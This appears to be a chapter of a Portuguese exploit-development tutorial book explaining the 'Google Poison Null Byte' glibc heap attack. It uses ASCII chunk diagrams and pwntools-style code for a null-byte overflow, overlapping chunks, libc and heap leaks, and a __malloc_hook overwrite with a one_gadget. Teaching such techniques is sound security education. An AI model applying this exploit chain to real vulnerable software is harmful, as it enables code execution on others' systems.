<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Google Poison Null Byte - Um Livrinho Sobre Exploit Dev</title>
        <!-- Custom HTML head -->
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../mapa.html">Mapa</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../stack/stack.html">Stack</a></li><li class="chapter-item "><a href="../../stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="../../stack/mitigacoes.html">Mitigações</a></li><li class="chapter-item "><a href="../../stack/ret2libc.html">Ret2LibC</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li><li class="chapter-item "><div>Avançado: Múltiplos ret2libc</div></li></ol></li><li class="chapter-item "><a href="../../stack/gotplt.html">GOT e PLT</a></li><li class="chapter-item "><a href="../../stack/rop/intro.html">ROP</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/primitivos.html">Primitivos</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/dump.html">ROPE</a></li></ol></li><li class="chapter-item "><div>Pivot</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/pivot.html">ROPE: pivot</a></li></ol></li><li class="chapter-item "><a href="../../stack/rop/SROP/SROP.html">SROP</a></li><li class="chapter-item "><a href="../../stack/rop/ret2dlresolve.html">ret2dl-resolve</a></li></ol></li><li class="chapter-item "><a href="../../stack/ASLR/aslr.html">ASLR</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/ASLR/corromperGOT.html">Corromper GOT</a></li><li class="chapter-item "><a href="../../stack/ASLR/ret2plt.html">ret2plt</a></li><li class="chapter-item "><a href="../../stack/ASLR/brute32.html">Bruteforce</a></li></ol></li><li class="chapter-item "><div>Canary</div></li><li class="chapter-item "><div>PIE</div></li><li class="chapter-item "><a href="../../stack/leakAll.html">Extra: Leakando tudo</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../heap/heap.html">Heap</a></li><li class="chapter-item "><a href="../../heap/intro.html">Intro</a></li><li class="chapter-item "><div>Bugs Gerais</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>UAF</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/geral/uaf/heap-two.html">Exploit Education: Heap Two</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../heap/relacionados/relacionados.html">Conceitos Relacionados</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/relacionados/io_list_all.html">_IO_list_all</a></li></ol></li><li class="chapter-item expanded "><a href="../../heap/malloc/intro.html">Atacando Malloc</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/malloc/teoria.html">Teoria</a></li><li class="chapter-item "><a href="../../heap/malloc/fastbinsDup.html">Fastbins Dup</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfForce.html">House of Force</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfSpirit.html">House of Spirit</a></li><li class="chapter-item "><a href="../../heap/malloc/unsafeUnlink.html">Unsafe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/safeUnlink.html">Safe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfEinherjar.html">House of Einherjar</a></li><li class="chapter-item expanded "><a href="../../heap/malloc/GooglePoisonNull.html" class="active">Google Poison Null Byte</a></li><li class="chapter-item "><a href="../../heap/malloc/PartialUnlink.html">Unsorted bins: Partial Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfOrange.html">House of Orange</a></li><li class="chapter-item "><a href="../../heap/malloc/comboFastUnsorted.html">Combo: Fast+Unsorted</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfLore.html">House of Lore</a></li><li class="chapter-item "><div>House of Rust</div></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfRabbit.html">House of Rabbit</a></li><li class="chapter-item "><div>House of Corrosion</div></li><li class="chapter-item "><div>House of Red</div></li><li class="chapter-item "><a href="../../heap/malloc/tcachedup.html">TCache Dup</a></li></ol></li><li class="chapter-item "><div>Extra</div></li><li class="spacer"></li><li class="chapter-item "><a href="../../linux_internals/linux.html">Linux Internals</a></li><li class="chapter-item "><a href="../../linux_internals/prerequisitos.html">Prerequisitos</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="google-poison-null-byte"><a class="header" href="#google-poison-null-byte">Google Poison Null Byte</a></h1>
<ul>
<li><a href="#google-poison-null-byte">Google Poison Null Byte</a></li>
<li><a href="#prerrequisitos">Prerrequisitos</a></li>
<li><a href="#ataque">Ataque</a></li>
<li><a href="#resumo">Resumo</a></li>
<li><a href="#info-leaks">info leaks</a>
<ul>
<li><a href="#libc">Libc</a></li>
<li><a href="#heap">Heap</a></li>
<li><a href="#full">Full</a></li>
</ul>
</li>
<li><a href="#exec">Exec</a>
<ul>
<li><a href="#fastbin">Fastbin</a></li>
<li><a href="#house-of-orange">House of Orange</a></li>
</ul>
</li>
<li><a href="#leituras-adicionais">Leituras Adicionais</a></li>
</ul>
<p>Essa tecnica se parece com a House of Einherjar, porem nela nos 
precisávamos usar null bytes no <code>prev_size</code> e dado que overflows 
de Null Byte tendem a ocorres com strings, nos nao poderíamos 
usa-los.</p>
<p>Assim, essa tecnica é mais realista, ja que leva badchars em 
consideração. Portanto, ela ja foi usada em múltiplos ataques na 
vida real.</p>
<p>Alem disso, eles se diferenciam pois nessa tecnica o nosso Null 
byte corrompe o <code>size</code> de um <code>FREE chunk</code>... Portanto, essa 
tecnica busca criar um overlap entre dois chunks</p>
<h1 id="prerrequisitos"><a class="header" href="#prerrequisitos">Prerrequisitos</a></h1>
<p>Os prerrequisitos dessa tecnica para o chunk vitima sao o sao o 
oposto da House of Einherjar:</p>
<ul>
<li>chunk overflow
<ul>
<li>Qualquer size </li>
<li>overflow de 1 Null Byte </li>
</ul>
</li>
<li>chunk vitima 
<ul>
<li>FREE </li>
<li><code>size</code> &gt; <code>0x100</code></li>
<li><code>size</code> <strong>NAO!!!</strong> terminado em <code>0x00</code>. Ex: <code>0x410</code>, <code>0x3a0</code>... </li>
</ul>
</li>
<li>chunk consolidação
<ul>
<li>Tamanho que permita consolidação: <code>size</code> &gt;= <code>0x90</code></li>
</ul>
</li>
<li>Um chunk qualquer para prevenir consolidação com o TOP</li>
</ul>
<h1 id="ataque"><a class="header" href="#ataque">Ataque</a></h1>
<pre><code class="language-py">chunk_A = malloc(0x18)  # chunk overflow: qualquer tamanho 
chunk_B = malloc(0x308) # chunk vitima: 0x310 
chunk_C = malloc(0x98)  # chunk consolidação: size &gt;= 0x90
chunk_D = malloc(0x98)  # Prevenir consolidação TOP

free(chunk_B)


OBS: Caso o libc tenha &quot;prev vs prev size&quot; (&gt; 2.26) :
  Precisaríamos forjar um PREV_SIZE falso pro chunk_B
  (ele deve ficar na posição do prev_size caso o chunk_B ja 
  tivesse sido reduzido (pad = 0x300-0x10))

  edit(chunk_B, &quot;\x00&quot;*0x2f0 + p16(0x300))
  free(chunk_B)

Para simplificar, vamos assumir uma versão mais antiga do libc
  

 _______________  chunk_A
|               |
|               |
|_______________| chunk_B
|       | 0x311 |  FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

edit(chunk_A, 0x18*b&quot;A&quot;)  # vamos assumir que o programa coloque o 
                          # NULL ao final automaticamente

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B
| AAAAA | 0x300 |  FREE: UNSORTED
|               |  SIZE ALTERADO PARA 0x300 (-0x10)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim, o chunk vitima teve seu tamanho diminuído em: mod 0x100

Vamos chamar essa diferença de DIFF

Por exemplo: 
  0x310 -&gt; 0x300    DIFF=0x10
  0X4a0 -&gt; 0x400    DIFF=0xa0
  ...               DIFF=(size mod 0x100)

Essa diferença ira gerar muitos problemas!

Agora, vamos alocar um chunk que divida o B por meio de remainder

chunk_B1 = malloc(0xf8) # 0x100 por exemplo, mas poderia ser também
                        # 0x110, 0x120, ..., 0x200,...

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| resto do chunk_B
|       | 0x201 | FREE: UNSORTED
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |       |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|


Nao atualizou o prev_size do chunk_C como deveria, pois
deu write num endereço 0x10 (DIFF) antes do correto  
(Justamente no Espaço bugado de tamanho DIFF)

Então o prev_size do chunk_C continua = 0x310


Agora, vamos alocar um chunk que gaste o &quot;resto do chunk_B&quot;

chunk_B2 = malloc(0x1f8) # 0x200

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | 
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x201 |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Assim como no anterior, errou a mira por 0x10 (DIFF)!

Dessa vez, nao atualiza o PREV_IN_USE do C


Portanto, por causa do PREV_USE e PREV_SIZE errados, 
se free(chunk_C), ele vai consolidar com chunk_B1 (que tem o mesmo 
endereço que o chunk_B), pois acredita que ele esta FREE


Assim, teríamos que forjar fd e bk no chunk_B1, para que ele 
passe o safe unlink! Mas nos precisaríamos de um heap leak e 
da habilidade de escrever NULLBYTES 

Para burlar isso, vamos simplesmente dar free() nele, gerando 
pointers legítimos

free(chunk_B1)

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1
| AAAAA | 0x101 | FREE: UNSORTED
|   FD  |   BK  | FD e BK legítimos
|               |
|               |
|               |
|               |
|               |
|_______________| chunk_B2
|       | 0x200 | PREV_USE = 0 (porem nao importa)
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|_______________| Espaço bugado de tamanho DIFF
| 0x200 |   1   |
|_______________| chunk_C
| 0x310 | 0x100 | PREV_USE = 0
|               | PREV_SIZE = 0x310
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Agora podemos chamar free no chunk_C, consolidando com o chunk_B1

free(chunk_C)

Da perspectiva do MALLOC temos:
 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

Porem nos sabemos que o chunk_B2 continua ali! Criando um overlap

 _______________  chunk_A
|               |
| AAAAAAAAAAAAA |
|_______________| chunk_B1 + chunk_C
| AAAAA | 0x401 | FREE: UNSORTED
|   FD  |   BK  | 
|               |
|               |
|               |
|               |
|               |
|. . . . . . . .| chunk_B2               
|               |
|               |
|               |
|               | 
|               |
|               |
|               |
|               |
|. . . . . . . .|
|               |
|               |
|               |
|               |
|               |
|               |
|               | 
|               |
|               |
|_______________| chunk_D
|               |
|               |
|               |
|_______________|

E lembrando que, a nao ser que CALLOC tenha sido usado, ainda 
existe um monte de metadados largados la no meio (por exemplo, no 
espaço DIFF), ou os próprios pointers do chunk_B2

</code></pre>
<h1 id="resumo"><a class="header" href="#resumo">Resumo</a></h1>
<pre><code class="language-py"># Google Poison Null

chunk_A = malloc(0x88)   # Qualquer size
chunk_B = malloc(0x108)  # Size: 0x110 -&gt; 0x100
chunk_C = malloc(0x88)   # Size normal
chunk_TOP = malloc(0x88) # Prevenir Consolidação

#edit(chunk_B, &quot;\x00&quot;*0xf0 + p16(0x100)) # size vs prev size
free(chunk_B)
edit(chunk_A, b&quot;\x00&quot;*0x88) # NULL Overflow: Diff=0x10, prev_use=0

chunk_B1 = malloc(0x88)
chunk_B2 = malloc(0x68)

free(chunk_B1)
free(chunk_C)
</code></pre>
<h1 id="info-leaks"><a class="header" href="#info-leaks">info leaks</a></h1>
<blockquote>
<p>Essas técnicas também funcionam para a House of Einherjar</p>
</blockquote>
<h2 id="libc"><a class="header" href="#libc">Libc</a></h2>
<p>Para um libc leak, basta alocar a primeira metade do <code>chunk_B + chunk_C</code></p>
<pre><code class="language-py">chunk_B1 = malloc(0x88)
</code></pre>
<p>Os metadados vao parar no chunk_B2, então basta ler o <code>fd</code> ou <code>bk</code> dele</p>
<pre><code class="language-py">chunk_B1 = malloc(0x88)
libc_leak = u64(read(chunk_B2, 8))
</code></pre>
<h2 id="heap"><a class="header" href="#heap">Heap</a></h2>
<p>Para o heap precisamos fazer a mesma coisa que o libc, porem se dermos <code>free()</code> em algum chunk 
que va para os <strong>UNSORTED</strong>, o chunk_B2.<code>bk</code> vai apontar para ele</p>
<p>Assim, no read do chunk_B2, vamos precisar separar os dois:</p>
<pre><code class="language-py">leak = read(chunk_B2, 16)
free()

libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
heap_leak = u64(leak[8:]) # bk -&gt; heap_leak
</code></pre>
<p>A opção mais fácil é o chunk_A, pq o endereço dele é o mesmo do heap nesse caso</p>
<pre><code class="language-py">chunk_B1 = malloc(0x88)
free(chunk_A)

leak = read(chunk_B2, 16)

libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
heap_leak = u64(leak[8:]) # bk -&gt; chunk_A
</code></pre>
<h2 id="full"><a class="header" href="#full">Full</a></h2>
<p>Assim, unindo todos os infoleaks</p>
<pre><code class="language-py"># Google Poison Null

chunk_A = malloc(0x88)   # Qualquer size
chunk_B = malloc(0x108)  # Size: 0x110 -&gt; 0x100
chunk_C = malloc(0x88)   # Size normal
chunk_TOP = malloc(0x88) # Prevenir Consolidação

#edit(chunk_B, &quot;\x00&quot;*0xf0 + p16(0x100)) # size vs prev size
free(chunk_B)
edit(chunk_A, b&quot;\x00&quot;*0x88) # NULL Overflow: Diff=0x10, prev_use=0

chunk_B1 = malloc(0x88)
chunk_B2 = malloc(0x68)

free(chunk_B1)
free(chunk_C)

# Info leaks

chunk_B1 = malloc(0x88)
free(chunk_A) # unsorted bins -&gt; heap leak

leak = read(chunk_B2, 16)
libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
heap_leak = u64(leak[8:]) # bk -&gt; chunk_A

libc.address = libc_leak - libc.sym.main_arena - 88
#log.success(&quot;Libc Addr (pwndbg: vmmap libc ou libs): &quot;+ hex(libc.sym.__malloc_hook))
#log.success(&quot;Heap: &quot;+hex(heap_leak))
</code></pre>
<h1 id="exec"><a class="header" href="#exec">Exec</a></h1>
<h2 id="fastbin"><a class="header" href="#fastbin">Fastbin</a></h2>
<p>Para conseguir execução, costuma-se apos os infoleaks, usar 
<code>find_fake_fast</code> no pwntools no <code>__malloc_hook</code> e corrompe-lo com 
um one gadget... como se fosse um fastbin dup</p>
<p>Normalmente, sera um chunk 0x70</p>
<pre><code class="language-py"># Google Poison Null
  - sem alterações

# Info leaks
  - sem alterações

# Exec: fastbin

chunk_A = malloc(0x88) # Pegar o chunk_A de volta para ele nao atrapalhar 
chunk_fast = malloc(0x68) # 0x70 fastbin: overlap chunk_B2

free(chunk_fast)
edit(chunk_B2, p64(libc.sym.__malloc_hook - 35)) # find_fake_fast

chunk_fast = malloc(0x68) # consumir
chunk_hook = malloc(0x68) # __malloc_hook

edit(chunk_hook, b&quot;\x00&quot;*19 + p64(ONE_GADGET))

malloc() # ativar o one_gadget
</code></pre>
<h2 id="house-of-orange"><a class="header" href="#house-of-orange">House of Orange</a></h2>
<p>Apesar de mais complicado e menos confiável 
(somente funciona 50% das vezes), voce também pode usa-la!</p>
<pre><code class="language-py"># Google Poison Null
  - sem alterações

# Info leaks
  - sem alterações

# Exec: House of Orange

</code></pre>
<h1 id="leituras-adicionais"><a class="header" href="#leituras-adicionais">Leituras Adicionais</a></h1>
<ul>
<li><a href="https://go.contextis.com/rs/140-OCV-459/images/Glibc_Adventures-The_Forgotten_Chunks.pdf">Glibc Adventures: The Forgotten Chunks</a></li>
<li><a href="https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html">The poisoned NUL byte, 2014 edition</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../heap/malloc/HouseOfEinherjar.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../../heap/malloc/PartialUnlink.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../heap/malloc/HouseOfEinherjar.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../../heap/malloc/PartialUnlink.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
